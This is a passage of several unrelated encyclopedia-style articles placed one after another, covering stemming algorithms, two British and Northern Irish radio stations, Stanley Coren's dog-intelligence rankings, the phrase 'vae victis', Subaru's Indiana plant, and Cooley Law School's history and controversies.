a stripping rule, a substitution rule replaces a suffix with an alternate suffix. For example, there could exist a rule that replaces ies with y. How this affects the algorithm varies on the algorithm's design. To illustrate, the algorithm may identify that both the ies suffix stripping rule as well as the suffix substitution rule apply. Since the stripping rule results in a non- existent term in the lexicon, but the substitution rule does not, the substitution rule is applied instead. In this example, friendlies becomes friendly instead of friendl. Diving further into the details, a common technique is to apply rules in a cyclical fashion (recursively, as computer scientists would say). After applying the suffix substitution rule in this example scenario, a second pass is made to identify matching rules on the term friendly, where the ly stripping rule is likely identified and accepted. In summary, friendlies becomes (via substitution) friendly which becomes (via stripping) friend. This example also helps illustrate the difference between a rule-based approach and a brute force approach. In a brute force approach, the algorithm would search for friendlies in the set of hundreds of thousands of inflected word forms and ideally find the corresponding root form friend. In the rule-based approach, the three rules mentioned above would be applied in succession to converge on the same solution. Chances are that the brute force approach would be slower, as lookup algorithms have a direct access to the solution, while rule-based should try several options, and combinations of them, and then choose which result seems to be the best. =Lemmatisation algorithms= A more complex approach to the problem of determining a stem of a word is lemmatisation. This process involves first determining the part of speech of a word, and applying different normalization rules for each part of speech. The part of speech is first detected prior to attempting to find the root since for some languages, the stemming rules change depending on a word's part of speech. This approach is highly conditional upon obtaining the correct lexical category (part of speech). While there is overlap between the normalization rules for certain categories, identifying the wrong category or being unable to produce the right category limits the added benefit of this approach over suffix stripping algorithms. The basic idea is that, if the stemmer is able to grasp more information about the word being stemmed, then it can apply more accurate normalization rules (which unlike suffix stripping rules can also modify the stem). =Stochastic algorithms= Stochastic algorithms involve using probability to identify the root form of a word. Stochastic algorithms are trained (they \\"learn\\") on a table of root form to inflected form relations to develop a probabilistic model. This model is typically expressed in the form of complex linguistic rules, similar in nature to those in suffix stripping or lemmatisation. Stemming is performed by inputting an inflected form to the trained model and having the model produce the root form according to its internal ruleset, which again is similar to suffix stripping and lemmatisation, except that the decisions involved in applying the most appropriate rule, or whether or not to stem the word and just return the same word, or whether to apply two different rules sequentially, are applied on the grounds that the output word will have the highest probability of being correct (which is to say, the smallest probability of being incorrect, which is how it is typically measured). Some lemmatisation algorithms are stochastic in that, given a word which may belong to multiple parts of speech, a probability is assigned to each possible part. This may take into account the surrounding words, called the context, or not. Context-free grammars do not take into account any additional information. In either case, after assigning the probabilities to each possible part of speech, the most likely part of speech is chosen, and from there the appropriate normalization rules are applied to the input word to produce the normalized (root) form. =n-gram analysis= Some stemming techniques use the n-gram context of a word to choose the correct stem for a word. =Hybrid approaches= Hybrid approaches use two or more of the approaches described above in unison. A simple example is a suffix tree algorithm which first consults a lookup table using brute force. However, instead of trying to store the entire set of relations between words in a given language, the lookup table is kept small and is only used to store a minute amount of \\"frequent exceptions\\" like \\"ran => run\\". If the word is not in the exception list, apply suffix stripping or lemmatisation and output the result. =Affix stemmers= In linguistics, the term affix refers to either a prefix or a suffix. In addition to dealing with suffixes, several approaches also attempt to remove common prefixes. For example, given the word indefinitely, identify that the leading \\"in\\" is a prefix that can be removed. Many of the same approaches mentioned earlier apply, but go by the name affix stripping. A study of affix stemming for several European languages can be found here.Jongejan, B.; and Dalianis, H.; Automatic Training of Lemmatization Rules that Handle Morphological Changes in pre-, in- and Suffixes Alike, in the Proceedings of the ACL-2009, Joint conference of the 47th Annual Meeting of the Association for Computational Linguistics and the 4th International Joint Conference on Natural Language Processing of the Asian Federation of Natural Language Processing, Singapore, August 2‚Äì7, 2009, pp. 145-153 =Matching algorithms= Such algorithms use a stem database (for example a set of documents that contain stem words). These stems, as mentioned above, are not necessarily valid words themselves (but rather common sub-strings, as the \\"brows\\" in \\"browse\\" and in \\"browsing\\"). In order to stem a word the algorithm tries to match it with stems from the database, applying various constraints, such as on the relative length of the candidate stem within the word (so that, for example, the short prefix \\"be\\", which is the stem of such words as \\"be\\", \\"been\\" and \\"being\\", would not be considered as the stem of the word \\"beside\\").. Language challenges While much of the early academic work in this area was focused on the English language (with significant use of the Porter Stemmer algorithm), many other languages have been investigated.Dolamic, Ljiljana; and Savoy, Jacques; Stemming Approaches for East European Languages (CLEF 2007)Savoy, Jacques; Light Stemming Approaches for the French, Portuguese, German and Hungarian Languages, ACM Symposium on Applied Computing, SAC 2006, Popoviƒç, Mirko; and Willett, Peter (1992); The Effectiveness of Stemming for Natural-Language Access to Slovene Textual Data, Journal of the American Society for Information Science, Volume 43, Issue 5 (June), pp. 384‚Äì390Stemming in Hungarian at CLEF 2005Viera, A. F. G. & Virgil, J. (2007); Uma revis√£o dos algoritmos de radicaliza√ß√£o em l√≠ngua portuguesa, Information Research, 12(3), paper 315 Hebrew and Arabic are still considered difficult research languages for stemming. English stemmers are fairly trivial (with only occasional problems, such as \\"dries\\" being the third-person singular present form of the verb \\"dry\\", \\"axes\\" being the plural of \\"axe\\" as well as \\"axis\\"); but stemmers become harder to design as the morphology, orthography, and character encoding of the target language becomes more complex. For example, an Italian stemmer is more complex than an English one (because of a greater number of verb inflections), a Russian one is more complex (more noun declensions), a Hebrew one is even more complex (due to nonconcatenative morphology, a writing system without vowels, and the requirement of prefix stripping: Hebrew stems can be two, three or four characters, but not more), and so on. =Multilingual stemming= Multilingual stemming applies morphological rules of two or more languages simultaneously instead of rules for only a single language when interpreting a search query. Commercial systems using multilingual stemming exist. Error metrics There are two error measurements in stemming algorithms, overstemming and understemming. Overstemming is an error where two separate inflected words are stemmed to the same root, but should not have been‚Äîa false positive. Understemming is an error where two separate inflected words should be stemmed to the same root, but are not‚Äîa false negative. Stemming algorithms attempt to minimize each type of error, although reducing one type can lead to increasing the other. For example, the widely used Porter stemmer stems \\"universal\\", \\"university\\", and \\"universe\\" to \\"univers\\". This is a case of overstemming: though these three words are etymologically related, their modern meanings are in widely different domains, so treating them as synonyms in a search engine will likely reduce the relevance of the search results. An example of understemming in the Porter stemmer is \\"alumnus\\" ‚Üí \\"alumnu\\", \\"alumni\\" ‚Üí \\"alumni\\", \\"alumna\\"/\\"alumnae\\" ‚Üí \\"alumna\\". This English word keeps Latin morphology, and so these near-synonyms are not conflated. Applications Stemming is used as an approximate method for grouping words with a similar basic meaning together. For example, a text mentioning \\"daffodils\\" is probably closely related to a text mentioning \\"daffodil\\" (without the s). But in some cases, words with the same morphological stem have idiomatic meanings which are not closely related: a user searching for \\"marketing\\" will not be satisfied by most documents mentioning \\"markets\\" but not \\"marketing\\". =Information retrieval= Stemmers are common elements in query systems such as Web search engines. The effectiveness of stemming for English query systems were soon found to be rather limited, however, and this has led early information retrieval researchers to deem stemming irrelevant in general.Baeza-Yates, Ricardo; and Ribeiro-Neto, Berthier (1999); Modern Information Retrieval, ACM Press/Addison Wesley An alternative approach, based on searching for n-grams rather than stems, may be used instead. Also, stemmers may provide greater benefits in other languages than English.Kamps, Jaap; Monz, Christof; de Rijke, Maarten; and Sigurbj√∂rnsson, B√∂rkur (2004); Language-Dependent and Language-Independent Approaches to Cross-Lingual Text Retrieval, in Peters, C.; Gonzalo, J.; Braschler, M.; and Kluck, M.

(1998); DARE: Domain Analysis and Reuse Environment, Annals of Software Engineering (5), pp. 125-141 =Use in commercial products= Many commercial companies have been using stemming since at least the 1980s and have produced algorithmic and lexical stemmers in many languages.Language Extension Packs , dtSearchBuilding Multilingual Solutions by using Sharepoint Products and Technologies , Microsoft Technet The Snowball stemmers have been compared with commercial lexical stemmers with varying results.CLEF 2003: Stephen Tomlinson compared the Snowball stemmers with the Hummingbird lexical stemming (lemmatization) systemCLEF 2004: Stephen Tomlinson \\"Finnish, Portuguese and Russian Retrieval with Hummingbird SearchServer\\" Google search adopted word stemming in 2003.The Essentials of Google Search, Web Search Help Center, Google Inc.

History  Former logo The station, also known as DTR or simply Downtown, began broadcasting on 16 March 1976 - the same day as Prime Minister Harold Wilson resigned. The station had a mini- scoop, breaking the news over an hour before BBC Radio Ulster. Downtown Radio has very much become part of the broadcasting landscape of Northern Ireland. Many of its presenters, such as Trevor 'Big T' Campbell and Candy Devine are household names - Campbell and Devine have been with Downtown since it began broadcasting. Initially, Downtown was only contracted to broadcast to the Greater Belfast area, on AM and (later ) FM. However, following the collapse of plans for a station in the Derry region (Northside Sound) in 1983, Downtown applied to the former Independent Broadcasting Authority to extend its coverage. Transmitters covering the North West, the Causeway Coast and Fermanagh/South Tyrone were opened in 1986 and 1987, and the station briefly rebranded itself as 'DTRFM' to reflect its new audience reach. The station reverted to Downtown Radio again in 1990 following the introduction of its sister station, Cool FM, although the latter only broadcast on the 97.4 frequency in the Greater Belfast area. Other transmitters remained with Downtown. New FM transmitters in South Down/Armagh, and Mid and East Antrim opened in the 1990s to improve reception in those areas. The station has been very highly regarded in the past for its news output, and has been a regular stop-off point for radio journalists covering Northern Ireland's Troubles over 30 years. It was the first radio station in Ireland to offer news bulletins, hourly on the hour. Changes in management made in 2007, as well as the success of the peace process, have led to Downtown reducing its news output somewhat. It is notable for being one of the few Independent Local Radio stations to still cater for minority tastes such as gospel and jazz. The country music programmes broadcast several times a week are among Downtown's highest listenership ratings. In December 2012 Downtown opened a small studio in Derry ahead of the UK City of Culture Year situated in the Food Quarter within Foyleside Shopping Centre. It remains open in use, mainly at the weekend with presenter-led programming on Saturday afternoon and Sunday covering a range of events in the region.  Schedules  As of September 2019, the schedules for Downtown Radio are as follows: Mondays to Fridays * 6.00am - Downtown Breakfast with Gary Myles and Glen Pavis: The best music and craic to start your day along with the latest news, weather and travel * 10.00am - Caroline Fleck: Lively mix of news, views, lifestyle, entertainment and music * 1.00pm - Owen Larkin in the afternoon. * 4.00pm - Downtown Drive: Neal getting you home with the greatest hits and the latest traffic and travel news * 7.00pm - Downtown Country with Big T: The best in American country music through the years (Friday edition hosted by Ken Bruce) * 10.00pm - Late Lounge with Paul Orr: Late night greatest hits show * 1.00am - All Night Downtown: Playing the best music through the night on Downtown Saturdays * 6.00am - Saturday Breakfast with David Gordon: Wake up with David with all your greatest hits * 10.00am - David Coleman: David presents your weekend mid-morning music show * 1.00pm - Paul Francis: Great music for your weekend afternoon with Paul Francis live in the North West studio * 4.00pm - Kevin McAllister: Best music and chat in Northern Ireland * 7.00pm - Saturday Night Country with Ken Bruce: A country start to your Saturday night * 10.00pm - Saturday Night 80s with Paul Kennedy: Playing the best 80s music for your Saturday night * 1.00am - All Night Downtown: Playing the best music through the night on Downtown Sundays * 6.00am - Downtown Years: John Kearns chooses the best songs from Downtown Day 1 in 1976 to the present day to start your Sunday morning * 8.00am - Sunday Morning Reflections: David Gordon hosts this Sunday morning programme with worship music, church news and faith issues * 10.00am - Easy Sunday with Kirstie: Kirstie McMurray hosts your easy listening Sunday music show * 1.00pm - Paul Francis: Great music for your weekend afternoon with Paul Francis live in the North West studio * 4.00pm - Kevin McAllister: Best music and chat in Northern Ireland * 6.00pm - Sunday Evening Reflections: Adrian Dempsey hosts the one hour Sunday evening religious show * 7.00pm - Big T Keeping It Country: Big T with all the best country music for your Sunday evening * 10.00pm - Ireland's Hot 7: Counting down Ireland's hottest top 7 country tracks * 10.30pm - Take it Easy with John Rosborough: Radio made for Sunday nights with classic artists and music to end your Sundayhttps://planetradio.co.uk/downtown/schedule/ * 1.00am - All Night Downtown: Playing the best music through the night on Downtown  Frequencies 1026 kHz: Antrim, Armagh, Ballyclare, Ballymena, Banbridge, Bangor, Belfast, Carrickfergus, Comber, Cookstown, Downpatrick, Dungannon, Lisburn, Lurgan, Maghera, Magherafelt, Newcastle, Newtownards, Portadown, Portaferry *96.4 MHz: Ballycastle, Ballymoney, Coleraine, Dungiven, Limavady, Portrush, Portstewart *96.6 MHz: Dungannon, Enniskillen, Omagh *97.1 MHz: Larne (East Antrim) *102.3 MHz: Antrim, Ballymena, Clough Mills, Magherafelt, Randalstown, Rasharkin, Templepatrick *102.4 MHz: Derry, Strabane *103.1 MHz: Armagh, Newry *103.4 MHz: Newcastle (Mourne) *103.4 MHz: (from Carnmoney Hill): Belfast, Newtownabbey, Holywood, Carrickfergus Notable past presenters Past presenters include Eamonn Holmes and Frank Mitchell.

In 2010 the station ceased broadcasting and the National version of Kiss took over the frequencies. History The station started broadcasting as a pirate radio station called For The People or FTP, which secured a licence to broadcast to the city of Bristol in 1990 on 97.2 MHz FM. After only a year on air, it was acquired by the Chiltern Radio Group and was renamed Galaxy 97.2. The station manager was Keith Francis, who also presented the 1000‚Äì1400 weekday programme. Galaxy 97.2 \\"The Hot FM\\" quickly gained popularity and achieved a 50% reach in the 15‚Äì24 target demographic.Jicrar 1992 It became the UK's best-performing dance music station in terms of reach, hours and share. On 4 September 1994, the group won the UK's first regional licence and Bristol's Galaxy 97.2 became Galaxy 101, broadcasting to an area stretching from Swansea in Wales through Bristol and south into Somerset on 101.0 MHz FM. Since reception of the new service was poor in central Bristol, the station was permitted by the Radio Authority to retain its 97.2 transmitter, which beforehand was separately licensed. In October 1995, the station became part of Chrysalis plc, who invested ¬£1 million in Galaxy 101. Galaxy 101 was sold to GWR Group and Scottish Radio Holdings in 2002 and rebranded Vibe 101, but this purchase was subsequently vetoed by the Competition Commission over concerns regarding control of the Bristol radio advertising market. The Commission ordered GWR to sell their stake, which was bought by Scottish Radio Holdings later that year. In July 2005, Scottish Radio Holdings was in turn taken over by the Emap group, owners of the Kiss brand that Galaxy 102 and Galaxy 105 were formerly licensed to use. Vibe 101 (latterly broadcasting as Vibe FM) was relaunched as Kiss 101 on 6 September 2006 as Emap integrated the stations of the former SRH into its own portfolio. Kiss 101 launched simultaneously with the re-branding of sister station Vibe 105-108 to Kiss 105-108, and a relaunch of Kiss 100. All three new Kiss stations started to carry a new blue Kiss logo, and the core music genre was changed to focus more on Dance. Kiss 105-108 and Kiss 101 retained many shows presented by the DJs who previously presented under the Vibe brand, but also offered shows that were networked across all three stations at the same time. Emap gained clearance from the UK communications regulator Ofcom to network programming between Kiss 101, Kiss 105-108 and Kiss 100. The company also pledged to significantly increase the amount of specialist programming on the former Vibe stations, with the minimum weekly amount of specialist output stated on the (former) Vibe licences more than doubling from 16 to 36 hours. Emap sold its radio and consumer magazine businesses, including the Kiss stations, to Bauer Verlagsgruppe on 29 January 2008, as part of the complete breakup and sale of the company to various suitors. Consequently, Emap Radio now operates as Bauer Radio. Thus Bauer became the fifth company to have owned \\"101\\" in six years. In December 2010, all the local programming of Kiss 101 (which already restricted to weekday breakfast & drive) was dropped to make the main station Kiss 100 a national service. Notable presenters Presenters broadcasting on Kiss 101 include Will Cozens. Transmitters The station broadcasts on 101.0 MHz FM from the Mendip transmitter in Somerset at a power of 40 kW, using the most powerful commercial FM transmitter in the UK. This transmitter is, however, highly directional with the maximum permitted effective radiated power (ERP) being directed towards the northwest to ensure delivery of a strong signal into South East Wales, particularly Cardiff, Newport and Bridgend. This also appears to be in order to penetrate the Welsh Valleys which lie immediately to the north of Cardiff, and to deliver signal towards settlements at the heads of the valleys such as Merthyr Tydfil. In all other directions, Ofcom's published technical parameters indicate that the radiated power is as little as 400 watts, particularly to the east in order to minimise interference to Classic FM's Wrotham, Kent FM transmitter on the adjacent frequency of 100.9 MHz which serves much of South East England. Kiss 101 also uses a filler transmitter for much of Bristol and the immediately surrounding area on 97.2 MHz FM at a power of 200 W, mixed polarisation, located on the concrete communications tower at Purdown, immediately to the west of the M32 motorway, towards the north of the city. The same site is also used by The Breeze for their only transmitter. The transmitter broadcasts on the frequency originally used by the station before it won the regional Severn Estuary licence in 1994 and thus clearance to also transmit on 101.0 from Mendip. Prior to this award, the station served Bristol only, with a coverage area no larger than that of The Breeze. Kiss 101 was formerly also carried on DAB on the MXR Severn Estuary multiplex until its closure in 2013. Kiss 100 can still be heard, nationally, on DAB as it is carried on the Digital One multiplex.

In 2000, the Essex Radio Group concern of DMGT was purchased by the GWR Group, (now 'Global') in a joint venture with Scottish Radio Holdings (SRH). At this point in time the GWR group also acquired Galaxy 101 in Bristol (Renamed to Vibe 101) from the Chrysalis media group (now 'Global'), extending the Vibe brand to South Wales and the West. For ownership reasons, the two Vibe stations were 'owned' by Vibe Radio Holdings, a company invented by and jointly owned by GWR and SRH. SRH bought both Vibe stations outright from GWR in 2003. In June 2005 the EMAP group acquired SRH. Emap's radio stations and public magazines was then bought by Bauer in January 2008. Audience figures (source: RAJAR Q4 2013) Kiss 105-108 is commercial market leader reaching 492,000 listeners each week The station achieved RAJAR 11 consecutive quarterly year on year increases whilst local programmed during key dayparts (under Programme Director Glen White with Stuart Grant on the breakfast show and Michael Lewis on Drive time) from 2007-2010.

The book explains Coren's theories about the differences in intelligence between various breeds of dogs. Coren published a second edition in 2006. Coren defines three aspects of dog intelligence in the book: instinctive intelligence, adaptive intelligence, and working and obedience intelligence. Instinctive intelligence refers to a dog's ability to perform the tasks it was bred for, such as herding, pointing, fetching, guarding, or supplying companionship. Adaptive intelligence refers to a dog's ability to solve problems on its own. Working and obedience intelligence refers to a dog's ability to learn from humans. Methods The book's ranking focuses on working and obedience intelligence. Coren sent evaluation requests to American Kennel Club and Canadian Kennel Club obedience trial judges, asking them to rank breeds by performance, and received 199 responses, representing about 50 percent of obedience judges then working in North America. Assessments were limited to breeds receiving at least 100 judge responses. This methodology aimed to eliminate the excessive weight that might result from a simple tabulation of obedience degrees by breed. Its use of expert opinion followed precedent. Coren found substantial agreement in the judges' rankings of working and obedience intelligence, with Border collies consistently named in the top ten and Afghan Hounds consistently named in the lowest. The highest ranked dogs in this category were Border collies, Poodles, German Shepherds, Golden Retrievers, and Doberman Pinschers. Dogs that are not breeds recognized by the American Kennel Club or Canadian Kennel Club (such as the Jack Russell Terrier) were not included in Coren's rankings. Evaluation When Coren's list of breed intelligence first came out there was much media attention and commentary both proExample: and con.Example: However over the years the ranking of breeds and the methodology used have come to be accepted as a valid description of the differences among dog breeds in terms of the trainability aspect of dog intelligence.Example:Example: In addition, measurements of canine intelligence using other methods have confirmed the general pattern of these rankingsExample: including a new study using owner ratings to rank dog trainability and intelligence. 79 ranks are given (plus 52 ties), a total of 138 breeds ranked: =Brightest Dogs= A Border Collie *Understanding of new commands: fewer than 5 repetitions. *Obey first command: 95% of the time or better.Coren1995 #Border Collie #Poodle #German Shepherd #Golden Retriever #Doberman Pinscher #Shetland Sheepdog #Labrador Retriever #Papillon (dog) #Rottweiler #Australian Cattle Dog =Excellent Working Dogs=Understanding of new commands: 5 to 15 repetitions. *Obey first command: 85% of the time or better. =Above Average Working Dogs=Understanding of new commands: 15 to 25 repetitions. *Obey first command: 70% of the time or better. =Average Working/Obedience Intelligence=Understanding of new commands: 25 to 40 repetitions. *Obey first command: 50% of the time or better. =Fair Working/Obedience Intelligence=Understanding of new commands: 40 to 80 repetitions. *Obey first command: 30% of the time or better. =Lowest Degree of Working/Obedience Intelligence=Understanding of new commands: 80 to 100 repetitions or more. *Obey first command: 25% of the time or worse.

Illustration by Paul Lehugeur, 1886. Vae victis () is Latin for \\"woe to the vanquished\\", or \\"woe to the conquered\\".Victis is the dative plural form of victus; the dative singular forms of the phrase are vae victo (masculine & neuter) & vae victae (feminine). It means that those defeated in battle are entirely at the mercy of their conquerors and should not expect‚Äîor request‚Äîleniency. Most of the events related by ancient historians about early Roman history are considered legends, with the Gaulish sack of Rome one of the first events which modern scholars are confident actually occurred, without accepting the colourful incidents reported by tradition. According to tradition, in 390 BC, an army of Gauls led by Brennus attacked Rome, capturing all of the city except for the Capitoline Hill. Brennus besieged the hill, and finally the Romans asked to ransom their city. Brennus demanded 1,000 pounds (329 kg) of gold and the Romans agreed to his terms. According to Plutarch's life of Camillus and Livy's Ab Urbe Condita (Book 5 Sections 34‚Äì49),Plutarch, Camillus 28 the Gauls provided steelyard balances and weights which were used to measure the amount of gold. The Romans brought the gold, but claimed that the provided weights were rigged in the Gauls' favor. The Romans complained to Brennus, who took his sword, threw it onto the weights, and exclaimed, \\"Vae victis!\\" The Romans thus needed to bring more gold as they had to counterbalance the sword as well. Livy and Plutarch claim that Camillus subsequently succeeded in defeating the Gauls before the ransom had to be paid, although Polybius, Diodorus Siculus and a later passage from Livy contradict this.

(SIA) is an automobile assembly plant in Lafayette, Indiana, which began as a joint venture between Subaru Corporation, formerly known as Fuji Heavy Industries (FHI), and Isuzu Motors Ltd. Today, the plant is a wholly owned subsidiary of Subaru Corporation which produces the Ascent, Impreza, Legacy and Outback models. As Subaru's only manufacturing facility outside of Asia, SIA produces about half of all Subaru vehicles sold in North America. History Subaru and Isuzu signed a joint venture agreement on May 29, 1986, to form Subaru-Isuzu Automotive and share production facilities at a new plant in Lafayette, Indiana, between Indianapolis and Chicago. The plant officially began producing the Subaru Legacy and Isuzu Pickup on September 11, 1989. After Isuzu sales significantly dwindled, Subaru dissolved their joint agreement. On January 1, 2003, Subaru purchased Isuzu's interest in the venture for one dollar and renamed the facility \\"Subaru of Indiana Automotive.\\" In addition to producing Subaru vehicles, the company continued to produce the Isuzu Rodeo and Honda Passport badge-engineered twins, as well as the Isuzu Amigo and Axiom through July 23, 2004. Next, under contract with Toyota, SIA next built the Camry from February 28, 2007, until May 27, 2016, when additional space was needed for additional Subaru production. Over the course of its history, SIA has been recognized for a variety of achievements related to safety, quality and the environment. The company is most recognized for becoming the first auto manufacturer in the United States to achieve zero-landfill status on May 4, 2004. In 2019, SIA celebrated multiple milestones, including its 4 millionth Subaru, 10 years as a zero-landfill facility, 30 years of production, and its 6 millionth vehicle overall. As the popularity of Subaru vehicles has increased in the United States, the plant's production volume has increased as well. For the 2020-21 fiscal year, SIA expected production to increase to 410,000 vehicles. Free guided tours are typically offered on Mondays and Wednesdays, except during its summer and winter shutdowns.

It was established in 1972 and has campuses in Lansing, Michigan; Grand Rapids, Michigan; and Riverview, Florida. History In 1972, the Thomas M. Cooley Law School was established by a group of lawyers and judges led by Thomas E. Brennan, a former Chief Justice of the Michigan Supreme Court. The school was named in honor of Thomas McIntyre Cooley (1824-1898), a prominent 19th-century jurist, who was also a former Michigan Supreme Court Chief Justice. Cooley was a dean of the University of Michigan Law School and visiting faculty at The Johns Hopkins University in Baltimore, Maryland. On July 28, 2014, the ABA and the Higher Learning Commission gave their approval to an affiliation between Cooley and Western Michigan University. On August 13, 2014, the affiliation became official and included Cooley changing its name from \\"Thomas M. Cooley Law School\\" to \\"Western Michigan University Cooley Law School\\". Cooley Law School classes are offered on each of Western Michigan's four campuses. Ranking and reputation Western Michigan University Thomas M. Cooley Law School is ranked 146-192 by U.S. News. During the 2018-2019 application cycle, the school admitted 54.94% of applicants. This is a marked decline from the school's 2017-2018 acceptance rate of 86.13%, which was the highest in the nation by almost 10%. The entering fall 2019 class had a median GPA of 2.95 and median LSAT of 145. In 2013, the United States Court of Appeals for the Sixth Circuit upheld the district court's dismissal of a class action lawsuit by Cooley graduates who sued over the school's allegedly deceptive post-graduate employment data. In the ruling, the court held that although the graduates' complaint showed that the statistics on which they relied were objectively untrue, their reliance on the statistics was unreasonable.United States Court Of Appeals For The Sixth Circuit, Nos. 12-2066/2130 Judge Quist noted that \\"it would be unreasonable for Plaintiffs to rely on two bare-bones statistics in deciding to attend a bottom-tier law school with the lowest admission standards in the country.\\" According to the organization Law School Transparency, Cooley is considered one of the most at-risk law schools for exploiting students for tuition. On May 15, 2020, the council of the American Bar Association's Section of Legal Education and Admissions to the Bar met remotely and determined Cooley was among ten law schools that had failed to significantly comply with Standard 316, which was revised in 2019 to provide that at least 75% of an accredited law school‚Äôs graduates who took a bar exam must pass one within two years of graduation. Cooley has been asked to submit a report by February 1, 2021. If the council does not find the report demonstrates compliance, Cooley will be asked to appear before the council at its May 2021 meeting. Section 316 has been criticized for discouraging minority enrollment in law schools and the American Bar Association has said that the Coronavirus pandemic will be taken into account when enforcing Section 316. Curriculum Cooley's curriculum is designed to prepare its graduates for entry into the legal profession. While most students work toward a Juris Doctor degree (J.D.), Cooley also offers the Master of Laws (LL.M.) degree as well as joint degrees in Master of Business Administration (J.D./M.B.A.) and Master of Public Administration (J.D./M.P.A.). The J.D/M.B.A. is offered in partnership with Oakland University; the J.D./M.P.A. is offered in partnership with Western Michigan University. Cooley operates programs allowing ABA-approved foreign study credit in Canada, Australia, and New Zealand. In addition, students are able to study at ABA-approved programs through partner law schools, including U.S. law schools operating programs in: Oxford, England; Santander, Spain; Toronto, Canada; M√ºnster, Germany. =Degree types= Cooley awards J.D. and LL.M. degrees. Students may also obtain joint M.P.A. or M.B.A. degrees awarded by Western Michigan University. =Concentrations= J.D. students are able to select from several concentrations (specialized areas of legal study): * General Practice * Litigation * Business Transactions * Administrative Law * International Law * Environmental Law * Intellectual Property * Canadian Practice * Focused Studies Accreditation Cooley has been accredited by the American Bar Association since 1975 and by the Higher Learning Commission since 2001. In 2017, Cooley was sanctioned by the American Bar Association for violating the ABA requirement that schools only admit students who appear capable of earning a Juris Doctor degree and passing a bar exam. The ABA announced in April 2018 that the school was now in compliance with the ABA standards for admissions, and the sanction was lifted. Clinical programs Cooley offers clinical programs at each campus. Students who participate in any of the Michigan clinics are allowed to practice law in Michigan under the Michigan Court Rules by representing clients in court, drafting client documents, and giving legal advice under the supervision of faculty. The Innocence Project is nationally recognized in the United States for helping free persons wrongfully incarcerated by obtaining DNA evidence and providing pro bono legal advocacy to overturn their convictions - Cooley's Innocence Project clinic has contributed to overturning four convictions. Cooley also offers an elder law clinic, Sixty Plus, Inc., which provides free legal services to senior citizens, as well as two Public Defender's clinics, which allow students to work in the Public Defender‚Äôs office with indigent clients who are accused of committing a crime. The Access to Justice Clinic provides a general civil practice, focusing on family and consumer law. Free legal help in family law and domestic violence matters is offered at the Family Legal Assistance Project. Evening and weekend students can gain experience in the Estate Planning Clinics or the Public Sector Law Project, which provides civil legal services of a transactional, advisory, legislative or systemic nature to governments. Cooley offers externships throughout the United States at over 2600 approved externship sites. Student externs work under the supervision of experienced attorneys, with the guidance of full-time faculty. Libraries Cooley has a library at each of its five campuses. Its main library on the Lansing campus is the Thomas E. Brennan Law Library. Legal research can be conducted at the libraries through a variety of media, including print, electronic, and multimedia sources. Reference librarians are present at each campus. The libraries have a total of about 60 staff. CoolCat is the online library catalog. The Cooley libraries collectively house roughly 670,000 volumes with an annual growth rate of more than 17,000 volumes. Cooley Law has a reciprocal agreement with both Western Michigan University and Oakland University allowing access to the materials in each institution's collections. Motto Cooley's Latin motto, In corde hominum est anima legis, was written in the 1970s by its founder, former Michigan Supreme Court Chief Justice Thomas E. Brennan. Brennan had originally described the meaning as \\"the spirit of the law is in the heart of man\\"; when a female organization called the Cooley Action Team argued that the motto should also refer to \\"the hearts of women\\", Justice Brennan agreed and changed it to \\"The spirit of the law is in the human heart\\". Costs The total cost of attending (indicating the cost of tuition, fees, and living expenses) Cooley for the 2017-18 academic year was between $69,104 and $70,134, depending on the campus. Bar passage 36.36% of first-time takers passed the bar exam in any jurisdiction in 2019. Previously, the average school bar passage rate had been about 50%. 53% of graduates passed the Michigan bar exam on their first attempt in July 2017, below the 83% average for other Michigan law schools. The average school bar passage rate was 51.86% in 2015, 52.73% in 2014, and 51.45% in 2013. Cooley's bar passage rates have averaged about 30% less than the state average pass rates. Cooley's bar passage for first-time takers for the February 2018 exam was 61%. =Post-graduation employment= According to disclosures required by the American Bar Association (ABA), 30.6% of graduates from the class of 2017 obtained full-time, long-term, bar-passage-required employment nine months after graduation, while 20.7% of graduates were unemployed 9 months after graduation. =Branch campuses and ABA accreditation= Original Main Building in downtown Lansing In 2002, when Cooley was expanding, Cooley filed a lawsuit against the American Bar Association for delaying the accreditation of its satellite campuses in Grand Rapids and Auburn Hills. Cooley was working to gain ABA accreditation since the satellite schools opened in June 2002, but had faced delays caused by disagreements on standards, resolved by a settlement of Cooley's lawsuit with the ABA, resulting in the ABA's acquiescence. In May 2012, Cooley opened a new branch campus in Riverview, Florida, in the Tampa Bay region. After suffering a 35% decline in enrollment across its five campuses between 2012 and 2013, Cooley announced on July 2, 2014, that it would not be enrolling first year students on its Ann Arbor campus for the Michaelmas term in 2014, but that current and transfer students could continue their studies at that campus. The announcement also called for cuts in faculty and staff. On October 3, after having outlined a transition plan in June, Cooley announced the Ann Arbor campus would permanently cease operations on December 31, 2014. The Ann Arbor campus was subsequently sold in 2015 to Concordia University Ann Arbor to house Concordia's School of Nursing. In 2019, Cooley closed its Auburn Hills campus. In 2020, Cooley announced it will close its Grand Rapids campus by August 31, 2021, pending approval by accrediting agencies, and that it had ceased providing classes at Western Michigan University's Kalamazoo campus. =Ranking and Judging the Law Schools= Cooley is shown as \\"Rank Not Published\\" in the U.S. News & World Report listing of law schools. Cooley is ranked second in the twelfth edition of Judging the Law Schools, which is published by Cooley.Brennan & DuLac, Judging the Law Schools , 12th Ed., 2010. Cooley relies heavily on its library statistics in its own Judging the Law School rankings. Specifically, Cooley has 10 library-based statistics in its 2010 rankings, which included separate entries for the total square footage in the library, the seats available in the library, the number of hours the library is open, the total number of volumes in the library, the total number of titles in the library, the number of librarians, the total hours that staff works in the library, and several other library-based criteria. Cooley has been subject to intense criticism and backlash for assigning equal value of these library-based statistics to far more important factors such as bar passage rate and percentage of graduates employed following graduation. =Defamation lawsuit by Cooley= In July 2011, Cooley filed a defamation lawsuit against the law firm Kurzon Strauss, LLP and four anonymous bloggers after they claimed the school was inflating its post-graduation employment statistics and was under federal investigation for its student loan default rate. The firm retracted the statements, but maintained the school used \\"'Enron-style' accounting techniques\\" to manipulate their jobs-placement data. In September 2013, U.S. District Judge Robert J. Jonker dismissed the lawsuit, stating that Cooley was a limited purpose public figure and did not provide adequate evidence the defendants acted with actual malice. The court further noted \\"the statement that 'Cooley grossly inflates its graduates' reported mean salaries' may not merely be protected hyperbole, but actually substantially true.\\" =Class action against Cooley= In August 2011, a class-action lawsuit by 12 Cooley graduates was filed in the United States District Court for the Western District of Michigan, allegingMacdonald v. Thomas M. Cooley Law School, in the United States District Court for the Western District of Michigan, Case No. 11-cv-00831 fraud and misrepresentation about Cooley's published employment information concerning its graduates. The school responded by filing a motion to dismiss. On July 20, 2012, 